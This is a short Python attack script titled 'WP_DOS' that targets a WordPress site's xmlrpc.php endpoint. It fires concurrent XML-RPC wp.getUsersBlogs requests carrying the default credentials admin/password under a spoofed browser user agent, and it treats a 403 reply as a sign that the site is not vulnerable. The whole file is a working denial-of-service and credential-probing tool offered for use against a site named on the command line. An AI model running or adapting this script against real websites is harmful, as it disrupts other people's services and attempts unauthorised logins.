import sys
import aiohttp
import asyncio
import random
import argparse

from pyfiglet import Figlet

fonts = Figlet().getFonts()
font = random.choice(fonts)

f = Figlet(font=font)
print(f.renderText('WP_DOS'))
print("\033[1;31;40m Created by Mohamed Thoufeeq")

parser = argparse.ArgumentParser()
parser.add_argument('-u', '--url', required=True, help='The URL of the WordPress website')
args = parser.parse_args()

url = args.url + "/xmlrpc.php"
headers = {'Content-type': 'text/xml', 'User-Agent': 'Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:47.0) Gecko/20100101 Firefox/47.0'}

async def send_request(session, payload):
    async with session.post(url, headers=headers, data=payload) as response:
        response_text = await response.text()
        print("\033[1;32;40m Response received: ", response_text)
        if response.status == 403:
            print("\033[1;31;40m The server returned a 403 status code, the website is not vulnerable.")
            sys.exit()

async def main():
    payload = b'''<methodCall>
    <methodName>wp.getUsersBlogs</methodName>
    <params>
    <param><value>admin</value></param>
    <param><value>password</value></param>
    </params>
    </methodCall>'''

    async with aiohttp.ClientSession() as session:
        tasks = [asyncio.ensure_future(send_request(session, payload)) for i in range(10)]
        await asyncio.gather(*tasks)

if __name__ == "__main__":
    print("\033[1;35;40m Sending requests...")
    asyncio.run(main())


